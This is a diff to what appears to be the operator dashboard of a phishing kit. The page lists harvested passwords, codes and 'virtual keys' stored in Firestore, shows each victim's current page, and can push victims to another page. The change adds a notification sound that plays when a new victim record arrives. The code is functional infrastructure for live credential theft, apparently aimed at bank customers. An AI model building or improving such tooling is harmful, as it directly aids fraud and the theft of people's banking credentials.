@@ -72,6 +72,9 @@
         <div id="data" class="list-group"></div>
       </div>
 
+      <!-- Elemento de audio oculto para la alerta -->
+      <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
       <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
       <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
       <script>
@@ -86,6 +89,16 @@
         };
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
+
+        let initialLoad = true; // Variable para evitar que suene al cargar la página por primera vez con los usuarios existentes
+
+        function reproducirSonido() {
+          const sound = document.getElementById("notifSound");
+          if (sound) {
+            sound.currentTime = 0;
+            sound.play().catch(e => console.log("Audio play bloqueado por el navegador:", e));
+          }
+        }
 
         function copiarTexto(texto, tipo) {
           navigator.clipboard.writeText(texto).then(() => {
@@ -121,7 +134,7 @@
             const passwordUser = data.password || data.pass || 'N/A';
             const codigoUser = data.cod1 || data.code || data.codigo || 'N/A';
             const claveVirtualUser = data.claveVirtual || data.virtualKey || data.clave_virtual || 'N/A';
-            const pagina = data.pagina_actual || '...'; // Nueva variable para la página
+            const pagina = data.pagina_actual || '...';
 
             docDiv.innerHTML = `
               <div class="d-flex w-100 justify-content-between align-items-center flex-wrap">
@@ -149,7 +162,17 @@
           });
         }
 
-        db.collection("prolme").onSnapshot((snapshot) => displayData(snapshot.docs));
+        db.collection("prolme").onSnapshot((snapshot) => {
+          snapshot.docChanges().forEach((change) => {
+            if (change.type === "added") {
+              if (!initialLoad) {
+                reproducirSonido();
+              }
+            }
+          });
+          initialLoad = false;
+          displayData(snapshot.docs);
+        });
         
         function deleteDocument(id) { db.collection("prolme").doc(id).delete(); }
         function actualizarPagina(id, num) { db.collection("prolme").doc(id).update({ page: num }); }
